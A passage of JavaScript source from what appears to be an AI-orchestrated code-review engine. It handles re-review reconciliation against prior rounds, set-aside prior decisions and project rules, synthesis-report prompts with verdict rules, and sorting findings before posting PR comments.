  if (tracked.marked) log(`Re-review: ${tracked.marked} unverified finding(s) sit at a site a still-live prior already tracks — noted on each, NOT absorbed into the prior: nothing checked them, so they may not hold it open`)
  if (tracked.collapsed) log(`Re-review: ${tracked.collapsed} unverified finding(s) sit at a site an equally UNVERIFIED prior already holds in the ledger — shown in this round's report but not persisted as a second ledger row, so an unchecked site does not gain a row per round`)
}
/** Why the prior round's fingerprint basis could not be established, as the lost-memory note names it. */
function unknownBasisWhy() {
  return priorBasisMismatch
      ? 'the revisions the loader printed did not survive transport intact (the list no longer matches its own check string) — a transport or version-skew loss'
      : (Array.isArray(priorRound?.['priorFpRevisions']) || typeof priorRound?.['fpBasisKnown'] === 'boolean')
      ? 'it was recovered from a stopped run whose checkpoints do not attest to one basis, its record could not be read, or it was written by an engine this one cannot place (no engine revision, or a newer one: a downgrade, or two installs sharing one store)'
      : 'the loader\'s answer did not say whether the basis was known (a relay that dropped the field, or a logger older than it) — a transport or version-skew loss'
}
/** The recidivism check skipped: the prior's fingerprints are not comparable, so its tombstones are dropped (and said so). */
function dropTombstonesForBasis() {
  // The prior round's fingerprints are not established as comparable to this round's freshly computed
  // ones (a different basis, a different engine, or a basis that could not be established). Skip the
  // check rather than comparing incompatible hashes and missing a regression in silence — the exact
  // silent miss this guard exists to remove. The tombstones minted from THIS round on are all under
  // the current basis (the incomparable carried ones are dropped at assembly), so the memory rebuilds
  // from here; the cost is recorded on the run record (reReview.tombstonesDropped).
  tombstonesDroppedForBasis = priorTombstones.length
  if (priorBasisVerdict === 'absent') {
    // The answer carried no basis verdict at all — the loader printed none (a logger of another craft
    // version) or the relay dropped it; the schema leaves it optional precisely so this stays visible
    // rather than being filled with a guessed boolean. It is a LOSS of re-review memory (the carried
    // tombstones are dropped for good), so it is stated where lost memory is stated, above the verdict.
    const note = `The prior round's answer carried no fingerprint-basis verdict (sameFpBasis), so its ${priorTombstones.length} resolved/dismissed finding(s) were not compared against this round and are no longer remembered. This is a transport or version-skew loss, not a fingerprint-basis change.`
    reReviewMemoryNote = reReviewMemoryNote ? `${reReviewMemoryNote}\n${note}` : note
    log(`⚠️ ${note}`)
  } else if (priorBasisVerdict === 'unknown') {
    // A round recovered from a stopped run whose checkpoints do not attest to one known basis, read
    // from an unreadable record, or written by an engine this one cannot place (no revision, or a newer
    // one) cannot establish the basis its tombstones were minted under. (A recovered round whose
    // checkpoints DO attest to one is decided like any other — realm @nick/craft #112.) Comparing anyway is the silent miss the guard exists
    // to prevent, so they are still dropped — but that is lost memory, and it is said so.
    // When the answer carried neither the raw revisions nor fpBasisKnown, the loader may well have known the basis —
    // the relay dropped the field, or a logger older than it answered — so the cause named is that.
    const why = unknownBasisWhy()
    const note = `The fingerprint basis of the prior round could not be established — ${why} — so its ${priorTombstones.length} resolved/dismissed finding(s) were not compared against this round and are no longer remembered.`
    reReviewMemoryNote = reReviewMemoryNote ? `${reReviewMemoryNote}\n${note}` : note
    log(`⚠️ ${note}`)
  } else {
    log('Re-review: the prior round was fingerprinted under a different, known basis — so the recidivism check is skipped and its ' + priorTombstones.length + ' carried tombstone(s) are dropped; the memory rebuilds from this round on (expected once, right after an upgrade that changed the basis)')
  }
}
/**
 * The tombstone a fresh finding returns among its fingerprint's: the newest one its tool does not tell
 * apart (toolDistinct — another deadnix binding, another lint), a later one winning a tie; undefined when none.
 * @param {LedgerAnswer[]} tombs @param {Finding} f @returns {LedgerAnswer | undefined}
 */
function returnedTombstone(tombs, f) {
  return tombs.filter(t => !toolDistinct(f, t)).reduce((/** @type {LedgerAnswer | undefined} */ best, t) => !best || tombstoneRound(t) >= tombstoneRound(best) ? t : best, undefined)
}
/** Fresh findings matching a prior tombstone: annotated as a regression or a re-raised dismissal. */
function flagReturningDefects() {
  // Every keyed tombstone of a fingerprint, not one: deadnix seeds carry no symbol, so one fingerprint holds
  // every binding of a file, and the binding a fresh finding returns is picked by toolDistinct below
  // (realm @nick/craft, vimarsha #242; rule #238).
  /** @type {Map<string, LedgerAnswer[]>} */
  const tombstonesByFp = new Map()
  for (const t of priorTombstones) {
    const fp = t.fp || fingerprint(t)
    if (t.ruleId) tombstonesByFp.set(fp, [...(tombstonesByFp.get(fp) || []), t])
  }
  let regressions = 0
  let reraised = 0
  const flagRegression = (/** @type {Finding} */ f) => {
    if (!f['ruleId']) return
    const hit = returnedTombstone(tombstonesByFp.get(fingerprint(f)) || [], f)
    if (!hit) return
    const why = String(hit.why || '')
    const m = /round (\d+)/.exec(why)
    // A LEDGER_ITEM carries no round, so this falls through to '?' unless a ledger extra supplies one.
    const r = m ? m[1] : (/** @type {{ round?: unknown }} */ (hit).round || '?')
    if (/^dismissed /.test(why)) {
      f['why'] = `${f['why']} NOTE: a defect the author dismissed in round ${r} has been re-raised.`
      reraised++
    } else {
      f['why'] = `${f['why']} REGRESSION: this exact defect was resolved in round ${r} and has reappeared.`
      regressions++
    }
  }
  confirmed.forEach(flagRegression)
  suspected.forEach(flagRegression)
  unverified.filter(f => !f.carriedUnverified).forEach(flagRegression)
  if (regressions) log(`Re-review: ${regressions} fresh finding(s) match a defect RESOLVED in an earlier round — annotated as REGRESSION in the report; the verdict still counts each by its severity`)
  if (reraised) log(`Re-review: ${reraised} fresh finding(s) match a defect the author DISMISSED in an earlier round — annotated as re-raised, not a regression; the verdict still counts each by its severity`)
}
// Absorption, unverified tracking and the recidivism check against the prior round's ledger.
function reconcileWithPriors() {
  if (priorRound) {
    const livePriors = [...adjudicated.stillOpen, ...adjudicated.regressed, ...adjudicated.carried, ...adjudicated.retired]
    // A RETIRED host absorbs NOTHING and tracks nothing — hoisted because BOTH passes below need it.
    const retired = new Set(adjudicated.retired)
    // Priors carrying the unverified tier were never adjudicated, so they are absent from `livePriors`
    // — they were carried straight into THIS round's `unverified` list instead. They are nonetheless
    // still-live rows of the next ledger, and they are precisely the hosts that matter for a site that
    // stays unchecked round after round, which is why the tracking pass takes them too.
    const carriedUnverified = unverified.filter(f => f.carriedUnverified)
    if (livePriors.length) absorbIntoLivePriors(livePriors, retired)
    // The tracking pass runs on its OWN guard, not inside the absorption one: a round whose only live
    // prior carries the unverified tier has an EMPTY `livePriors` (nothing was adjudicated) and is
    // exactly the round where a site accretes a second unchecked row. And that is only the EMPTY case:
    // a site can hold a live judged prior AND a carried unverified one at the same file+rule, and the
    // judged one comes first in this array. The collapse must not depend on that — markTrackedUnverified
    // picks its host BY TIER, not by this order (see lib/review-adjudicate.mjs); the order here is only
    // the fallback for a finding no unverified host tracks.
    const trackingHosts = [...livePriors, ...carriedUnverified]
    if (trackingHosts.length) trackUnverifiedAtPriors(trackingHosts, retired, carriedUnverified)
    // RECIDIVISM. A freshly discovered finding whose fingerprint matches a prior tombstone has RETURNED,
    // and the two tombstone ORIGINS mean different things. A `resolved` tombstone is a defect that was
    // actually fixed, so a match is a REGRESSION — the fix came undone. A `dismissed` tombstone is a
    // prior the AUTHOR rejected/justified and whose carry-check found the code around it UNCHANGED
    // (retirement): the engine's own separate `reopened` path already handles the code-CHANGED case, so
    // a match here is not a regression at all — nothing was fixed and nothing broke — it is the same
    // dismissed defect being re-raised, and it is labelled as exactly that. Exact fingerprint match
    // only, and only for a finding that carries a ruleId: an ad-hoc finding has no stable identity, so
    // it gets no tombstone check rather than a fuzzy one (fuzzy title matching was measured at 2/59
    // recall). This is a HUMAN-FACING annotation on `why` only: it neither moves the finding between
    // tiers nor changes the verdict, which still counts each returning finding by its own severity
    // exactly as a novel one (whether a regression should escalate the verdict is a separate decision,
    // deliberately not taken here). All three live tiers are scanned — confirmed, suspected AND
    // unverified — because the unverified tier is precisely where a returning defect lands when its
    // verifier died or was floor-skipped, which is the run where the "it came back" signal matters most;
    // carried-unverified priors are excluded, as they are not freshly discovered.
    if (priorTombstones.length && !priorFpComparable) dropTombstonesForBasis()
    else if (priorTombstones.length) flagReturningDefects()
  }
}
reconcileWithPriors()

const dropped = results.reduce((n, r) => n + r['dropped'], 0)
// Findings whose verdict was reached after at least one returned vote was DISCARDED as off-schema.
// DERIVED from the flag tierFromVotes sets, not pushed from a branch — the same discipline `notRun`
// is built with, and for the same reason. Read over `results` (what verification produced) rather
// than the post-absorption lists, because this counts the panels, not what survived the report; the
// REFUTED side is included deliberately — a finding deleted from the run on a thinned panel is the
// worst case this counter exists to make visible.
// The UNVERIFIED side is in the population for the same reason, and it is the largest class: a panel
// whose EVERY returned vote answered off-schema is routed to the unverified tier, which is the
// MAXIMUM discard there is. Reading only the judged tiers made the counter report 0 for exactly that
// case, so the field was short by its biggest class and the cross-run ranking could not see the class
// at all. The skipped Low/Info share that tier and carry no flag, so the filter excludes them by
// construction.
const thinned = results
  .flatMap(r => [...r['confirmed'], ...r['suspected'], ...(r['refuted'] || []), ...(r['unverified'] || [])])
  .filter(f => (f.votesDiscarded || 0) > 0).length
// `scopeNotRun` leads: a scope the caller asked for and did not get is the first thing a reader of
// the verdict needs, ahead of anything the run itself failed to finish.
const notRun = [...limitNotRun(), ...scopeNotRun, ...results.flatMap(r => r['notRun'])]
/** The usage-limit stop as a notRun entry, once it happened. @returns {string[]} */
function limitNotRun() {
  return limitStop.seen() ? [limitStop.note()] : []
}
// Files no profile covered are a coverage hole, not a footnote — but they are NOT a `notRun` entry.
// `notRun` means "this ran badly; re-run it": every other entry is a failure a re-run can fix, and
// lib/analyze-runs.mjs ranks the list by EXACT STRING to surface repeated fragility. A note
// embedding a count and file names is unique per run, so it filled that ranking with count-1 rows
// and sank the genuinely repeated failures — while saying the opposite of what it means, since
// re-running will never review these files. The record carries them as `uncoveredFiles`; the
// reporting below draws the INCOMPLETE marker from `coverageNotes`, alongside `notRun`.
// Same reasoning as `uncoveredFiles` directly above, from the other direction: a deliberate saving
// is not a coverage hole either, so it joins neither `notRun` nor `coverageNotes` and never reaches
// `incompleteNotes`. It is counted across runs by lib/analyze-runs.mjs, under its own heading.
const savedByFloor = results.flatMap(r => r['savedByFloor'] || [])
const coverageNotes = uncoveredGap.length ? [uncoveredNotRunNote(uncoveredGap)] : []
const incompleteNotes = [...notRun, ...coverageNotes]
const criticNotes = results.map(r => r['criticNotes']).filter(n => n && n.trim() && n.trim() !== 'coverage complete').map(n => n.trim()).join(' · ')

// A re-review with adjudicated content (still-open/regressed/resolved/carried priors) must fall
// through to the full synthesis so the re-review report renders — a bare "Approve — no findings"
// here would wrongly erase still-open/regressed priors.
const hasAdjudicated = hasAdjudicatedTracks()
function hasAdjudicatedTracks() {
  return !!(adjudicated.stillOpen.length || adjudicated.regressed.length || adjudicated.resolved.length || adjudicated.carried.length || adjudicated.retired.length)
}
// `unverified` counts here too: they are real reported findings, and falling into the "nothing
// survived" branch would delete them from the report entirely.
// `priorTombstones.length` keeps this exit from silently dropping the recidivism memory: a clean
// re-review round that found nothing and adjudicated nothing must still fall through to the ledger
// step so earlier tombstones are carried forward, exactly as carried priors (which make
// `hasAdjudicated` true) already are — otherwise the memory evaporates on the first quiet round.
function nothingSurvived() {
  return !confirmed.length && !suspected.length && !unverified.length && !hasAdjudicated && !priorTombstones.length && !priorRejected.length
}
async function noFindingsExit() {
  // floorPremiseHeld is not yet known at this early exit (it is re-read after synthesis), so the
  // suffix here rests on notRun + coverageNotes alone: INCOMPLETE for a genuine not-run, PARTIAL
  // COVERAGE for a coverage hole a re-run will not fix.
  const earlySuffix = verdictSuffix({ notRun, coverageNotes })
  await logRun(reviewRecord({ verdict: honestVerdict(`Approve${earlySuffix}`, notRun), round: thisRound, findings: summarizeFindings([]), dimensions: [], verification: { candidates: dropped, confirmed: 0, refuteRate: refuteRate(dropped, dropped) }, notRun }))
  const verdictLine = earlySuffix
    ? `⚠️ Approve${earlySuffix} — gate ${mergedGateStatus}; no findings survived, but ${incompleteNotes.join('; ')} — this verdict covers ONLY what ran. Files listed as matching no language profile are outside this engine (${supportedLangLabel(PROFILES)}) and re-running will not review them — review them by hand or with a tool that speaks their language${notRun.length ? '; anything else in the list is a failure to fix and re-run' : ''}.`
    : `✅ Approve — gate ${mergedGateStatus}; no findings across ${active.map(p => p.id).join('+')}.`
  // `scopeSection()` here too. The comment on its declaration promises it reaches "whichever report
  // is returned — every early exit included", and this exit was the one that did not: a run whose
  // requested scope was dropped and which then found nothing returned a report that never named the
  // path the caller asked for. The verdict line carries the CLASS (through `notRun`); only this
  // section carries the path, and a dropped scope matters most precisely when the answer is Approve.
  return out(honestVerdictLine([`## Verdict`, verdictLine, ``, `## Gate`, mergedProvenance, carriedSection(),
    ...(uncoveredFiles.length ? [``, `## Not reviewed (no language profile)`, ...uncoveredFiles.map((/** @type {string} */ f) => `- ${f}`)] : []),
  ].join('\n'), notRun) + scopeSection())
}
// ---- Prior decisions: set aside what the project already rejected, never silently ----
// A finding a recalled decision answers leaves the verdict and is listed under its own section with
// the decision's reason, author, date and link; it is persisted as `rejected`, so a re-review carries
// it like any other dismissal. It stays a finding when it is Critical/High or when its decision's
// scope cannot be shown unchanged since the recorded commit — one agent runs the `git diff --quiet`
// lines, and its death leaves every decision unconfirmed, so every such finding is raised again.
// On a re-review the decisions reach the still-open and regressed priors as well: a fresh duplicate
// of a live prior was absorbed into it (reconcileWithPriors), so the prior is where a rejected finding
// sits, and it counts in the verdict unless it is set aside there.
// A finding an open question answers (a deferred one) takes the same path and is listed under Known and
// deferred, persisted as `deferred` (priorDisposition).
// Which record answers a finding is matched by file, line and lens, a near miss decided by ONE cheap
// judge (`decision-match`, launched only when a disputed pair exists; realm @nick/craft, node #230).
/** @type {Array<Finding & { priorTier: string, priorDecision: string, priorKind: 'decision' | 'question' | 'rule' }>} */
let priorRejected = []
/**
 * The ledger disposition of a set-aside finding. One a project rule covered is `covered`, not a dismissal:
 * the re-review adjudicates it like an open prior and the rules, recalled again, decide again — so a rule
 * withdrawn or superseded since lets it back into the verdict (realm @nick/craft, node #273).
 * @param {{ priorKind: string }} f
 */
const priorDisposition = f => (f.priorKind === 'question' ? 'deferred' : f.priorKind === 'rule' ? 'covered' : 'rejected')
// How many of `priorRejected` were live priors, not findings verified this round.
let priorRejectedLive = 0
/** The tiers a prior-record split returned, back into the run's lists. @param {Record<string, Finding[]>} t */
function takeTiers(t) {
  confirmed = t['confirmed'] || []
  suspected = t['suspected'] || []
  unverified = t['unverified'] || []
  adjudicated.stillOpen = t['stillOpen'] || []
  adjudicated.regressed = t['regressed'] || []
}
async function setAsidePriorDecisions() {
  const live = adjudicated.stillOpen.length + adjudicated.regressed.length
  const r = await applyPriorDecisions({ confirmed, suspected, unverified, stillOpen: adjudicated.stillOpen, regressed: adjudicated.regressed }, priorDecisionsIn.decisions, toCheck => ragent(
    REPO_DIRECTIVE + scopeCheckPrompt(toCheck),
    { label: 'decision-scope', phase: 'Synthesize', schema: SCOPE_CHECK_SCHEMA, model: CULL_MODEL },
  ), 'why', prompt => ragent(prompt, { label: 'decision-match', phase: 'Synthesize', schema: MATCH_JUDGE_SCHEMA, model: CULL_MODEL, effort: 'low' }))
  takeTiers(r.tiers)
  priorRejectedLive = live - adjudicated.stillOpen.length - adjudicated.regressed.length
  // A prior's ledger tier is its own; one that carries none is persisted as confirmed (it was adjudicated).
  priorRejected = r.setAside.map(f => /^(confirmed|suspected|unverified)$/.test(f.priorTier) ? f : { ...f, priorTier: 'confirmed' })
  for (const n of r.notes) log(`priorDecisions: ${n}`)
  // A decision whose commit this repo does not know is named with the refusals, apart from a changed scope.
  priorDecisionsIn.refused.push(...r.refused)
}
await setAsidePriorDecisions()
// ---- Project rules: a class of findings the project accepts, covered visibly (realm @nick/craft, node #273) ----
// After the decisions: a finding ONE cheap judge (`rule-match`, launched only when a finding sits in a
// rule's scope) puts under a project rule leaves the verdict and the PR comments like a rejected one and is listed under Covered by project rules; a Critical one, or one the judge
// gave no verdict on, stays — and the section says so. It is persisted `covered` (priorDisposition), never
// carried as a dismissal: each round adjudicates it and applies the rules afresh.
/** @type {string[]} */
let ruleNotices = []
async function coverByProjectRules() {
  const live = adjudicated.stillOpen.length + adjudicated.regressed.length
  const r = await applyProjectRules({ confirmed, suspected, unverified, stillOpen: adjudicated.stillOpen, regressed: adjudicated.regressed }, priorDecisionsIn.decisions, 'why', prompt => ragent(prompt, { label: 'rule-match', phase: 'Synthesize', schema: RULE_JUDGE_SCHEMA, model: CULL_MODEL, effort: 'low' }))
  if (!r.rules) return
  takeTiers(r.tiers)
  priorRejectedLive += live - adjudicated.stillOpen.length - adjudicated.regressed.length
  priorRejected = priorRejected.concat(r.covered.map(f => /^(confirmed|suspected|unverified)$/.test(f.priorTier) ? f : { ...f, priorTier: 'confirmed' }))
  ruleNotices = r.notices
  memory = { ...memory, covered: r.covered.length }
  for (const n of r.notes) log(`project rules: ${n}`)
}
await coverByProjectRules()
if (nothingSurvived()) return await noFindingsExit()

// ================= Synthesize one merged report =================
// ONE sentence, three readers: the first-pass template, the re-review template and the mechanical
// fallback report. It was written twice before and the two copies already meant different things.
// It names ALL FOUR ways into the tier — a Low/Info nobody paid a verifier for, a Medium nobody
// paid for because the verdict was already fixed at Block, a finding whose verifier died, and a
// panel whose every returned vote was off-schema — because a reader who is told only the cheap
// reasons will read a dead verifier's findings as cheap ones, and a panel that ANSWERED unreadably
// did not die: calling it a death misdescribes the largest discard there is.
const UNVERIFIED_PREAMBLE = 'These were not verified: no verifier was spent on them because a Low/Info finding cannot change the verdict, or because the verdict was already fixed at Block by a confirmed Critical/High and a Medium cannot move it, or the verifier that should have judged them died before returning a verdict, or every vote the panel DID return answered off-schema and carried none of the judgements the tier is decided on — each entry says which in its own `why`. Nothing below has been checked against the code — treat each as a lead, not a finding.'
phase('Synthesize')
const isRereview = !!priorRound
// `foundInRound` is for the record only; the synthesis prompt stays as it was (realm @nick/craft, node #248).
/** @param {string} k @param {unknown} v */
const withoutRound = (k, v) => (k === 'foundInRound' ? undefined : v)
const rereviewData = rereviewDataOf()
function rereviewDataOf() {
  return isRereview ? {
    resolved: adjudicated.resolved, stillOpen: adjudicated.stillOpen,
    // `retired` is NOT folded into `carried`: they answer different questions for the reader. A
    // carried prior is re-checked next round; a retired one leaves the ledger, and on a full rescan
    // its re-discovery is kept as a New Confirmed finding — so folding them made the report say a
    // defect was "carried forward unchanged" while listing the same defect under New.
    regressed: adjudicated.regressed, carried: adjudicated.carried, retired: adjudicated.retired, neu: confirmed,
  } : null
}
// The verdict-line clause the synthesis model is told to append when coverage was not complete. It
// names the SAME cause the record string names: a genuine not-run is INCOMPLETE (re-running helps),
// a coverage hole is PARTIAL COVERAGE (a re-run will not fix it). floorPremiseHeld is deliberately
// not consulted here — the synthesis prompt is composed before the verdict exists, and the revoked-
// floor cause is appended afterward by markVerdictIncomplete.
// An Approve holds only over what ran: the model is told so, and honestVerdictLine enforces it after (realm @nick/craft, node #299).
const neverApproveClause = neverApproveClauseOf()
function neverApproveClauseOf() {
  return notRun.length ? ' Part of this review did not run, so the verdict is never Approve: where it would be Approve, write "\u26a0\ufe0f INCOMPLETE" in its place.' : ''
}
const incompleteClause = incompleteClauseOf() + neverApproveClause
function incompleteClauseOf() {
  return incompleteNotes.length
    ? ` Append " · ⚠️ ${notRun.length ? 'INCOMPLETE — part of this review did not run' : 'PARTIAL COVERAGE — a coverage hole a re-run will not fix'}: ${incompleteNotes.join('; ')}; findings may be undercounted." to the verdict line.`
    : ''
}
// Set when the synthesis agent answered but not with report text, so the fallback names the real cause.
let synthesisUnusable = false
// The synthesis agent's report text, or null when it died or answered with something else (logged).
async function synthesize() {
  return ragent(
    `You are consolidating a code review (languages: ${active.map(p => p.id).join(', ')}) into ONE markdown report. Do NOT invent findings — only use what is given.

VERDICT RULE: the verdict is driven ONLY by Confirmed findings.
- ⛔ Block if any Confirmed Critical or High.
- ⚠️ Warning if Confirmed Medium only.
- ✅ Approve if no Confirmed Critical/High/Medium.
Suspected findings NEVER change the verdict — they are surfaced for the author. UNVERIFIED findings were never checked at all — EITHER no verifier was spent (a Low/Info cannot move the verdict) OR the verifier that should have judged them died before returning one OR every vote it did return was off-schema and unreadable, so a Critical or High can carry this tier. They change nothing and must never be presented as confirmed, as checked, or as cheap.${strict ? '\nSTRICT MODE: the maintainability bar is a presumption of block — if ANY Confirmed finding has source "maintainability" (or lists "maintainability" among its merged `sources`) at Medium or above, the verdict is ⛔ Block (state in the verdict line that strict maintainability mode escalated it).' : ''}

CALIBRATE severities across the Confirmed set so the same kind of issue is not Critical in one place and Medium in another; adjust outliers and say so in one line if you do. A finding whose why carries "raised to Medium from" with "${PATH_FLOOR_MARK}" is never calibrated below Medium in the report: the record already holds it at Medium. For any resource-exhaustion / algorithmic-complexity finding (SAF-009), severity must be MEASURED, not inherited from "same class as X" — a shared mechanism implies nothing about shared magnitude. Demand attack cost against a REAL-DATA baseline (not just the PoC's own numbers) and attacker-bytes-per-victim-CPU-second; where the finding carries no such measurement, say so and rate it conservatively rather than borrowing a neighbour's label.

DEDUPLICATE across lenses: findings that describe the same underlying defect (same file, same/overlapping lines, fixes that collapse into one edit) MUST be merged into ONE entry — keep the highest severity and the clearest why, credit the other lens in one clause. Never list per-lens duplicates as separate findings.

${isRereview ? `This is a RE-REVIEW (round ${thisRound}). Produce, in order:
1. \`## Verdict\` — driven ONLY by Still-open + Regressed + New Confirmed findings (Block on any Critical/High; Warning on Medium; else Approve). Resolved and Carried NEVER change the verdict.${incompleteClause}
2. \`## Gate\` — ${JSON.stringify(mergedProvenance)}.${carriedLine}
3. \`## ✅ Resolved\` — prior findings the fixes closed (one line each); omit if empty.
4. \`## 🔴 Still open\` — prior findings still present; \`severity · file:line · [ruleId] · what · why\`; omit if empty.
5. \`## ⚠️ Regressed\` — new defects the fixes introduced at a prior site; omit if empty.
6. \`## 🆕 New\` — Confirmed findings from the delta lenses (same format); omit if empty. In Still open, Regressed, New, Suspected and Unverified alike: a finding with a non-empty \`toolRule\` (a gate tool's own rule) carries it in the brackets, always labelled \`tool:\` so it never reads as a catalog id: \`[ruleId · tool: toolRule]\`, or \`[tool: toolRule]\` when ruleId is empty. A gate tool's finding without a \`toolRule\` (its source a gate tool: clippy, clippy-pedantic, semgrep, semver, semver-checks, statix, deadnix, fmt, tool) prints its \`title\` verbatim as \`what\` — never reworded: a past decision is matched to it by that title.
6a. \`## Suspected (needs confirmation)\` — the SUSPECTED JSON below: findings a verifier DID examine and could not confirm; same format; never merge these into New or Still open, never call them confirmed — they never change the verdict; omit the section if empty.
6b. \`## Unverified (not checked)\` — the UNVERIFIED JSON below, same format, and OPEN the section with exactly this sentence: "${UNVERIFIED_PREAMBLE}" Never merge these into New, Still open or Carried, never call them confirmed, and do not re-rank or upgrade their severity. They change nothing about the verdict. Omit the section if empty.
7. \`## 🔽 Carried\` — settled priors (rejected/justified/deferred) that are re-checked again next round, collapsed to a count + one-line list; omit if empty.
7b. \`## 🏁 Retired\` — dismissals whose code has not moved since the author ruled on them: they leave the ledger and are NOT re-checked again. Collapse to a count + one-line list; omit if empty. If a defect here also appears under \`## 🆕 New\`, say so on its line — the dismissal stopped being tracked and the site was raised afresh; that is expected, not a contradiction.${uncoveredFiles.length ? `\n8. \`## Not reviewed\` — these changed files match no active language profile and were NOT reviewed; list them verbatim: ${JSON.stringify(uncoveredFiles)}` : ''}${criticNotes ? `\n9. \`## Coverage gaps\` — surface verbatim: ${JSON.stringify(criticNotes)}` : ''}
RE-REVIEW DATA (JSON): ${JSON.stringify(rereviewData, withoutRound, 2)}` : `Produce, in order:
1. \`## Verdict\` — one line (emoji + reason).${incompleteClause}
2. \`## Gate\` — ${JSON.stringify(mergedProvenance)}.${carriedLine}
3. \`## Confirmed\` — findings by severity (Critical first), each as \`severity · file:line · [ruleId] · what · why · fix\` and a blast-radius note when present. Include the \`ruleId\` in brackets when the finding has a non-empty one; omit the brackets otherwise. A finding with a non-empty \`toolRule\` (a gate tool's own rule) carries it in the same brackets, always labelled \`tool:\` so it never reads as a catalog id: \`[ruleId · tool: toolRule]\`, or \`[tool: toolRule]\` when ruleId is empty. When a finding carries a non-empty \`whereChecked\`, append \`· Premise checked at: <value>\` — that is the off-site evidence the author needs in order to re-check the claim, not decoration. A gate tool's finding without a \`toolRule\` (its source a gate tool: clippy, clippy-pedantic, semgrep, semver, semver-checks, statix, deadnix, fmt, tool) prints its \`title\` verbatim as \`what\` — never reworded: a past decision is matched to it by that title.
4. \`## Suspected (needs confirmation)\` — findings a verifier DID examine and could not confirm; same format; omit the section if empty.
5. \`## Unverified (not checked)\` — same format, and OPEN the section with exactly this sentence: "${UNVERIFIED_PREAMBLE}" Never merge these into Confirmed or Suspected, never call them confirmed, and do not re-rank or upgrade their severity. Omit the section if empty.
6. \`## Fix first\` — the few highest-leverage Confirmed items.
${uncoveredFiles.length ? `7. \`## Not reviewed\` — these changed files match no active language profile and were NOT reviewed; list them verbatim: ${JSON.stringify(uncoveredFiles)}` : ''}
${criticNotes ? `8. \`## Coverage gaps\` — surface verbatim: ${JSON.stringify(criticNotes)}` : ''}`}

CONFIRMED (JSON): ${JSON.stringify(confirmed, withoutRound, 2)}

SUSPECTED (JSON): ${JSON.stringify(suspected, withoutRound, 2)}

UNVERIFIED — NOT CHECKED (JSON): ${JSON.stringify(unverified, withoutRound, 2)}`,
    { label: 'synthesis', phase: 'Synthesize', effort: 'medium' },
  // Without a schema the answer is the agent's final text; anything else is no report at all — but a
  // LIVE agent that answered with a non-string, or with blank text, did not die, and the fallback must
  // not say it did: every non-null answer that reaches the fallback is an unusable one.
  ).then(text => {
    if (typeof text === 'string' && text.trim()) return text
    if (text != null) {
      synthesisUnusable = true
      const what = typeof text === 'string' ? 'blank text' : Array.isArray(text) ? 'an array' : `a value of type ${typeof text}`
      log(`⚠️ synthesis agent answered with ${what}, not report text — discarded; using the mechanical fallback report`)
    }
    return null
  })
}
const report = await synthesize()

// ---- Sorting before publication (realm @nick/craft, nodes #270, #271, #277) ----
// With `comment` only, the findings a PR comment could carry — Confirmed, and Suspected the reviewer may
// still choose to ask about — are sorted: a defect is posted below, a doubtful one is listed for the human
// reviewer, who chooses to ask the author, post it as a defect or not post it. Unverified findings were
// never checked against the code and are offered to no one. What a decision set aside or a rule covered
// left these lists before (setAsidePriorDecisions, coverByProjectRules) and is not sorted. The
// outside-the-diff sign needs the changed lines: ONE cheap agent prints the hunk headers of the PR's
// whole diff (base...working tree, not a re-review's delta) for every candidate's file (no candidate with a
// file — no agent); dead, the sign is not applied and the section says so.
/** @typedef {{ defect: Finding[], doubtful: Array<{ f: Finding, reasons: string[] }>, note: string, candidates: Finding[], changed: Map<string, Array<[number, number]>> | null }} Sorting */
/** The findings a PR comment could carry, each with the tier it sits in, whatever a carried field says. @returns {Finding[]} */
function sortCandidates() {
  return [...confirmed.map(f => ({ ...f, tier: 'confirmed' })), ...suspected.map(f => ({ ...f, tier: 'suspected' }))]
}
/** @returns {Promise<Sorting | null>} */
async function sortBeforePosting() {
  if (!postComments) return null
  const candidates = sortCandidates()
  // Every candidate's file: a file the answer does not name reads as untouched, so none may go unasked —
  // and a doubtful finding's line decides whether it can be posted as a line comment at all.
  const files = [...new Set(candidates.map(f => String(f['file'] || '')).filter(Boolean))]
  const range = baseRef ? `--merge-base ${shq(baseRef)}` : 'HEAD'
  const changed = files.length
    ? readDiffLines(await ragent(REPO_DIRECTIVE + diffLinesPrompt(range, files), { label: 'diff-lines', phase: 'Synthesize', schema: DIFF_LINES_SCHEMA, model: CULL_MODEL, effort: 'low' }))
    : null
  const note = files.length && !changed ? 'the diff-lines agent died, answered unreadably, or its command did not finish, so whether a line is inside the diff was not judged' : ''
  if (note) log(`⚠️ sorting: ${note}`)
  const sorted = { ...sortFindings(candidates, changed), note, candidates, changed }
  log(`sorting: ${sorted.defect.length} defect(s) to post, ${sorted.doubtful.length} doubtful for the reviewer`)
  return sorted
}
const sorting = await sortBeforePosting()
/**
 * The run record's sorting, null without `comment`: the counts, and the doubtful findings by their number
 * in the report, which the reviewer's later choice is appended under (`craft-log-run sorting-choice`;
 * realm @nick/craft, node #281).
 */
function sortingRecord() {
  if (!sorting) return null
  const findings = sorting.doubtful.map(({ f, reasons }, i) => postable(f, i, reasons))
  return { defect: sorting.defect.length, doubtful: sorting.doubtful.length, inDiffJudged: !sorting.note, ...(sorting.note ? { inDiffNote: sorting.note } : {}), findings }
}
/**
 * The run record's count of the findings going against an active memory record (realm @nick/craft, nodes
 * #281, #282): with `comment`, over the sorted candidates and the changed lines the sorting read, each marked
 * whether it went to the PR as a defect; without it, over the same tiers with the outside-the-diff sign untold.
 */
function contradictionsRecord() {
  const defects = new Set(sorting ? sorting.defect : [])
  return contradictionRecord(sorting ? sorting.candidates : sortCandidates(), sorting ? sorting.changed : null, f => fingerprint(f), f => defects.has(/** @type {Finding} */ (f)))
}
/** The report section of the doubtful findings, '' without `comment`. */
function doubtfulReport() {
  return sorting ? doubtfulSection(sorting.doubtful, sorting.note) : ''
}

// Optional: post the defect findings as inline PR comments (best-effort); the doubtful wait for the reviewer.
// Best-effort means it must not FAIL the run; it does not mean it may be INVISIBLE. The caller asked
// for comments, so whether they landed is part of the answer: the outcome is returned under a schema
// and logged, including "the agent died and we do not know". Discarding the return value made the
// prompt's own "report that" reach nobody.
async function postPrComments() {
  const defects = sorting ? sorting.defect : confirmed
  if (postComments && defects.length) {
    const posted = await ragent(
      `Post these Confirmed code-review findings as inline comments on the current branch's PR using \`gh\`. If gh is missing/unauthenticated or there is no PR, post nothing and say so in \`reason\` — never fail.
For each finding with a real file:line, add a review comment anchored to that file:line whose body is the finding's \`body\` VERBATIM — its first line and its last line (an HTML comment) are how a later session ties a reply to the finding. Findings:
${JSON.stringify(defects.map(f => ({ file: f.file, line: f.line, body: findingCommentBody(f) })), null, 2)}
Return {posted: <how many comments you actually created>, reason: <one line: the PR you posted to, or why nothing was posted>}.`,
